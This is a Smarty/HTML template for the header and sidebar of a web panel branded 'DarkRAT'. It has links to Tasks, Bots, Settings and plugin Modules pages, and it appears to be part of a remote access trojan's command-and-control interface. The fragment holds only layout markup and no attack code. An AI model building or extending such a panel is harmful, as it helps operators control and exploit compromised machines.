<header class="header">
    <nav class="navbar navbar-expand-lg">
        <div class="container-fluid d-flex align-items-center justify-content-between">
            <div class="navbar-header">
                <!-- Navbar Header--><a href="{$defaulRoutes["Main@index"]}" class="navbar-brand">
                    <div class="brand-text brand-big visible text-uppercase"><strong class="text-primary">Dark</strong><strong>RAT</strong></div>
                    <div class="brand-text brand-sm">D<strong>R</strong></div></a>
                <!-- Sidebar Toggle Btn-->
                <button class="sidebar-toggle"><i class="fa fa-long-arrow-left"></i></button>
            </div>
            <div class="right-menu list-inline no-margin-bottom">

                <!-- Languages dropdown
                <div class="list-inline-item dropdown"><a id="languages" rel="nofollow" data-target="#" href="#" data-toggle="dropdown" aria-haspopup="true" aria-expanded="false" class="nav-link language dropdown-toggle"><img src="img/flags/16/GB.png" alt="English"><span class="d-none d-sm-inline-block">English</span></a>
                    <div aria-labelledby="languages" class="dropdown-menu"><a rel="nofollow" href="#" class="dropdown-item"> <img src="img/flags/16/DE.png" alt="English" class="mr-2"><span>German</span></a><a rel="nofollow" href="#" class="dropdown-item"> <img src="img/flags/16/FR.png" alt="English" class="mr-2"><span>French  </span></a></div>
                </div>
                -->
                <!-- Log out               -->
                <div class="list-inline-item logout">                   <a id="logout" href="{$defaulRoutes["Main@logout"]}" class="nav-link"> <span class="d-none d-sm-inline">Logout </span><i class="icon-logout"></i></a></div>
            </div>
        </div>
    </nav>
</header>

<div class="d-flex align-items-stretch">
    <!-- Sidebar Navigation-->
    <nav id="sidebar">
        <!-- Sidebar Header-->
        <ul class="list-unstyled">
            <li class=""><a href="{$defaulRoutes["Main@index"]}"> <i class="icon-home"></i>Home </a></li>
            <li class=""><a href="{$defaulRoutes["Main@tasks"][0]}"> <i class="icon-list"></i>Tasks </a></li>
            <li class=""><a href="{$defaulRoutes["Main@bots"]}"> <i class="icon-computer"></i>Bots </a></li>
            <li class=""><a href="{$defaulRoutes["Main@settings"]}"> <i class="icon-settings"></i>Settings </a></li>
<!--
            <li><a href="#exampledropdownDropdown" aria-expanded="false" data-toggle="collapse"> <i class="icon-windows"></i>Example dropdown </a>
                <ul id="exampledropdownDropdown" class="collapse list-unstyled ">
                    <li><a href="#">Page</a></li>
                    <li><a href="#">Page</a></li>
                    <li><a href="#">Page</a></li>
                </ul>
            </li>
-->
        </ul>
        <div>

        </div>
        <!-- Sidebar Navidation Menus--><span class="heading">Modules</span>
        <div class="plugin_registrations">
            <ul class="list-unstyled">
                {foreach from=$navRegistrations key=name item=navTab}
                    <li class=""><a href="/{$name}"> <i class="fa fa-cube"></i> {$name} </a></li>
                {/foreach}
            </ul>
        </div>
        <!--
        <span class="heading">Extras</span>
        <ul class="list-unstyled">
            <li> <a href="#"> <i class="icon-settings"></i>Demo </a></li>
            <li> <a href="#"> <i class="icon-writing-whiteboard"></i>Demo </a></li>
            <li> <a href="#"> <i class="icon-chart"></i>Demo </a></li>
        </ul>
        -->
    </nav>
    <!-- Sidebar Navigation end-->
    <div class="page-content">

